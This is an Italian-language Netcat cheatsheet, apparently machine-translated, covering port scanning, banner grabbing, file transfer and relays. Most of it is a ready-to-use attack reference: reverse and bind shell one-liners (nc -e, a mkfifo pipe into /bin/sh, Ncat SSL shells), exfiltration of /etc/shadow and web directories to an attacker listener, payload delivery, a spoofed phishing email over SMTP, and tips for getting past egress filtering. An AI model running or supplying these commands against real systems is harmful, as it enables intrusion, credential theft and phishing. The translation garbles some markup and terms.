<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<palign="centro">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Sfruttamento e conchiglie">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protocolli TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="Licenza">
</p>

<palign="centro">
  <b>🌐 Leggi e scrivi dati grezzi attraverso connessioni di rete utilizzando i protocolli TCP e UDP</b>
</p>

---

## 📋 Sommario

- [Panoramica e filosofia Netcat](#-panoramica--filosofia-netcat)
- [Varianti Netcat e dilemma del sapore](#-netcat-variants--the-flavor-dilemma)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Netcat tradizionale (`nc.traditional`)](#tradizionale-netcat-nctradizionale)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Confronto strumenti: varianti Netcat vs Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Varianti di installazione e cambio](#-installazione--varianti di cambio)
- [Flag della riga di comando principale](#-core-command-line-flags)
- [Scansione porta e acquisizione banner](#-port-scanning--acquisizione banner)
- [Inverti e lega le conchiglie](#-reverse--bind-shells)
  - [Esecuzione della shell tradizionale (`-e`)](#esecuzione-della-shell-tradizionale--e)
  - [OpenBSD FIFO Named Pipe Reverse Shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [Shell di associazione FIFO OpenBSD](#openbsd-fifo-bind-shell)
  - [Shell TLS crittografata con Ncat (`--ssl`)](#shell-tls-crittografata-con-ncat---ssl)
- [Tecniche di trasferimento file](#-tecniche-di-trasferimento-file)
  - [Obiettivo dell'attaccante (estrazione)](#obiettivo-dell'attaccante-esfiltrazione)
  - [Attaccante al bersaglio (consegna del carico utile)](#attaccante-al-bersaglio-consegna del carico utile)
  - [Archiviazione al volo delle directory (`tar + nc`)](#archiviazione-al-volo-delle-directory-tar--nc)
- [Inoltro porte e relè di rete](#-port-forwarding--network-relay)
- [Emulazione server Web e honeypot](#-web-server--emulazione-honeypot)
- [Debug di rete e interazione manuale del protocollo](#-network-debugging--manual-protocol-interaction)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e OPSEC](#-considerazioni-difensive--opsec)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e filosofia Netcat

Originariamente scritto nel 1995 da **Hobbit**, **Netcat** (spesso invocato semplicemente come `nc`) è celebrato nelle comunità di sicurezza informatica e Unix come il **"TCP/IP Swiss Army Knife"**. 

A differenza dei protocolli applicativi di alto livello o degli strumenti di gestione sovradimensionati, Netcat fa una cosa eccezionalmente bene: **apre pipe di rete a livello di byte grezzi su socket TCP o UDP e le collega direttamente all'input standard (`stdin`) e all'output standard (`stdout`)**.

Che tu stia ascoltando shell inverse, stabilendo canali di esfiltrazione nascosti, servizi di cattura di banner, trasferendo file senza SMB/FTP o diagnosticando il filtraggio dei pacchetti del firewall, Netcat rimane un'utilità indispensabile nell'arsenale di ogni professionista della sicurezza.

---

## ⚖️ Varianti Netcat e il dilemma del sapore

Una delle fonti di confusione più frequenti durante i penetration test e le sfide CTF è che **più implementazioni distinte condividono il comando `nc`**. Capire con quale variante stai interagendo determina la sintassi e le possibilità di carico utile.
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **Predefinito su:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Caratteristica chiave:** Per impostazione predefinita, compilato senza il flag `-e` (esecuzione del programma) per prevenire banali vulnerabilità legate all'esecuzione di codice arbitrario.
- **Identificazione della sintassi:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Soluzione alternativa per l'esecuzione della shell:** utilizza le pipe denominate Linux (`mkfifo`) per collegare `stdin` e `stdout` a `/bin/sh`.

### Netcat tradizionale (`nc.traditional`)
- **Autore originale:** Hobbit (v1.10).
- **Caratteristiche principali:** Compilato con la direttiva `-DGAPING_SECURITY_HOLE`, che consente il flag nativo `-e` / `-c` (`nc -e /bin/bash`).
- **Identificazione della sintassi:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **Mantenuto da:** Gordon Lyon (Fyodor) / The Nmap Project.
- **Tratto principale:** Una riscrittura moderna che supporta la **crittografia TLS/SSL**, elenchi di controllo degli accessi IP (`--allow`, `--deny`), brokeraggio della connessione (`--broker`), proxy SOCKS4/5 ed esecuzione nativa multipiattaforma.

---

## ⚖️ Confronto degli strumenti: varianti Netcat vs Socat

| Caratteristica | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmappa) | `socat` |
|---------|---------------------------|---------------------||------|---------|
| **Flag eseguibile (`-e`)** | ❌ Spogliato | ✅ Nativo (`-e`) | ✅ Nativo (`-e`, `--exec`) | ✅ Nativo (`EXEC:`) |
| **Crittografia SSL/TLS** | ❌No | ❌No | ✅ Nativo (`--ssl`) | ✅ Nativo (`OPENSSL:`) |
| **Gusci per tubi FIFO** | ✅ Sì (`mkfifo`) | ✅ Sì | ✅ Sì | ✅ Sì |
| **Modalità di scansione delle porte** | ✅ Sì (`-z`) | ✅ Sì (`-z`) | ❌No | ❌No |
| **Ascoltatore persistente** | ✅ Sì (`-k`) | ❌ No (esce alla disconnessione) | ✅ Sì (`-k`, `--keep-open`) | ✅ Sì (`fork`) |
| **Supporto IPv6** | ✅ Nativo (`-6`) | ❌Limitato | ✅ Nativo (`-6`) | ✅Nativo |
| **Proxy / Client SOCKS** | ✅ Sì (`-X`, `-x`) | ❌No | ✅ Sì (`--proxy`) | ✅ Supporto proxy completo |
| **Chat multi-cliente/Broker**| ❌No | ❌No | ✅ Nativo (`--broker`) | ❌ Configurazione manuale |
| **Predefinito su Kali / Debian** | ✅ Sì (`/bin/nc`) | 🔄 Disponibile (`apt`) | 🔄 Disponibile (`ncat`) | 🔄 Disponibile (`socat`) |

---

## 📥 Varianti di installazione e cambio

Sulle distribuzioni basate su Debian (incluso Kali Linux), puoi installare tutte le versioni e passare da una all'altra tramite `update-alternatives`:
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
Per eseguire esplicitamente una variante specifica senza modificare le impostazioni predefinite a livello di sistema:
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ Flag principali della riga di comando

| Bandiera | Significato e descrizione |
|------|-----------------------|
| `-l` | **Modalità di ascolto**: attende le connessioni in entrata invece di avviare quelle in uscita. |
| `-v` | **Modalità dettagliata**: stampa informazioni dettagliate sulla connessione e sulla diagnostica (`-vv` per una maggiore verbosità). |
| `-n` | **IP solo numerico**: disabilita la risoluzione DNS inversa per velocità e invisibilità. |
| `-p <port>` | **Porta locale**: specificare la porta locale su cui eseguire il collegamento o l'ascolto. |
| `-u` | **Modalità UDP**: utilizza il protocollo UDP invece del flusso TCP predefinito. |
| `-k` | **Continua ad ascoltare**: continua ad ascoltare e ad accettare nuove connessioni dopo che un client si disconnette. |
| `-w <sec>` | **Timeout**: timeout in secondi per la creazione della connessione e le letture del socket inattivo. |
| `-z` | **Modalità Zero I/O**: modalità di scansione; non inviare dati di payload e chiudere il socket immediatamente dopo l'handshaking. |
| `-q <sec>` | **Esci dopo EOF**: attende i secondi specificati dopo aver ricevuto EOF su `stdin` prima di terminare. |
| `-s <ip>` | **IP di origine**: associazione a un'interfaccia locale/indirizzo IP di origine specifico. |
| `-4` / `-6` | Forza esclusivamente l'indirizzamento IPv4 o IPv6. |

---

## 🔍 Scansione delle porte e acquisizione di banner

Mentre strumenti dedicati come `nmap` o `masscan` sono preferiti per spazzate complete, Netcat fornisce un controllo delle porte istantaneo e senza dipendenza quando si atterra su un bersaglio limitato.

### Scansione rapida delle porte
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### Cattura banner di servizio

L'acquisizione di banner estrae stringhe di versione grezza da demoni remoti per l'identificazione delle vulnerabilità:
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 Inverti e unisci le conchiglie

Il collegamento di un interprete di comandi remoti (`/bin/sh`, `/bin/bash`, `cmd.exe`) su un socket Netcat è una delle tecniche di test di penetrazione più fondamentali.

### Esecuzione tradizionale della shell (`-e`)

Se nel sistema di destinazione è installato `netcat-traditional` o `ncat` con supporto di esecuzione:
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### OpenBSD FIFO Named Pipe Reverse Shell

Nelle moderne distribuzioni Debian, Ubuntu, Kali e Fedora, `nc` non ha il flag `-e`. Utilizza una **pipe denominata FIFO (First-In-First-Out)** per reindirizzare l'input e l'output standard:
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### Come funziona la pipeline FIFO:
1. `rm -f /tmp/f`: rimuove qualsiasi file pipe non aggiornato.
2. `mkfifo /tmp/f`: crea una pipe FIFO con nome speciale in `/tmp`.
3. `cat /tmp/f`: legge l'input consegnato nel tubo e lo inoltra a `/bin/sh -i`.
4. `| /bin/sh -i 2>&1`: genera una shell interattiva, reindirizzando l'errore standard (`stderr`) all'output standard (`stdout`).
5. `| nc 10.10.14.5 4444 >/tmp/f`: passa l'output della shell attraverso la rete all'aggressore, mentre riscrive le sequenze di tasti di rete ricevute in `/tmp/f`.

### Shell di associazione FIFO di OpenBSD

Quando la destinazione ha un IP pubblico o locale instradabile e le regole del firewall in entrata consentono il traffico:
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### Shell TLS crittografata con Ncat (`--ssl`)

Il traffico Netcat non crittografato può essere ispezionato tramite IDS/IPS e tap di rete. `ncat` supporta la crittografia TLS/SSL in modo nativo:
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 Tecniche di trasferimento file

Quando SSH, SCP, FTP e SMB vengono bloccati o disinstallati, Netcat fornisce una pipeline di trasferimento file istantanea e bidirezionale su qualsiasi porta TCP aperta.

### Obiettivo dell'attaccante (estrazione)
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### Dall'attaccante al bersaglio (consegna del carico utile)
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### Verifica dell'integrità (checksum)

Verifica sempre l'integrità dei byte dopo i trasferimenti Netcat non elaborati:
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### Archiviazione immediata delle directory (`tar + nc`)

Trasferisci intere strutture di directory senza creare file di archivio temporanei intermedi sul disco della vittima:
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 Port forwarding e relè di rete

Netcat può agire come un relè di rete leggero senza richiedere il port forwarding SSH:
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Emulazione server Web ed Honeypot

### Server HTTP minimalista a file singolo

Fornire un payload HTTP statico o acquisire credenziali inviate dai browser:
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### Chat multi-cliente/broker di messaggi (`ncat`)

Ncat include una modalità broker integrata, creando una stanza di ritrasmissione ad hoc simile a IRC per gli operatori della squadra rossa:
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ Debug della rete e interazione manuale del protocollo

### Iniezione di posta SMTP non elaborata
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### Recupero posta POP3 non elaborata
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Ascoltatore standard** | `nc -lvnp <PORT>` |
| **Ascoltatore persistente** | `nc -lvnp <PORT> -k` |
| **Connetti all'host remoto** | `nc -vn <HOST> <PORT>` |
| **Connetti tramite UDP** | `nc -u -vn <HOST> <PORT>` |
| **Scansione porta TCP (veloce)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Scansione porta UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **Shell per pipe con nome OpenBSD** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Conchiglia tradizionale (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Shell SSL crittografata (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Ricevi file (ascoltatore Exfil)**| `nc -lvnp <PORT> > output_file` |
| **Invia file (mittente exfil)** | `nc -vn <IP> <PORT> < input_file` |
| **Cartella streaming tramite Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **Estrai cartella trasmessa in streaming** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Afferra banner** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Considerazioni difensive e OPSEC

1. **Avviso di testo in chiaro non crittografato:**
   - Netcat standard **non** utilizza l'incapsulamento crittografico. Qualsiasi password, token di sessione o comando shell inviato tramite testo in chiaro `nc` può essere estratto dai sensori NSM (Network Security Monitoring) (Zeek, Suricata, Wireshark).
   - Utilizzare `ncat --ssl` o avvolgere il traffico all'interno di un tunnel SSH/TLS quando possibile.
2. **Audit di processo e sistema:**
   - Sui sistemi Linux, la registrazione dell'esecuzione del processo (`auditd`, eBPF, Falco) segnala le invocazioni di `nc` contenenti flag come `-e` o comandi che creano `/tmp/f` e `mkfifo`.
   - Su Windows, gli agenti EDR contrassegnano o mettono in quarantena regolarmente i file binari `nc.exe` a causa di firme statiche note.
3. **Restrizioni in entrata del firewall:**
   - Scegli sempre porte in uscita comuni (`80`, `443`, `53`) quando configuri i listener di shell inversa per aggirare le rigide politiche di filtraggio in uscita.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Questo cheatsheet è progettato esclusivamente per test di penetrazione autorizzati, valutazione delle vulnerabilità, competizioni CTF e scopi di amministrazione del sistema. Intercettare il traffico di rete, esfiltrare dati o eseguire reverse shell contro sistemi senza esplicito consenso scritto è illegale e punibile in base alle leggi sulla sicurezza informatica in tutto il mondo. Utilizzare in modo responsabile ed etico.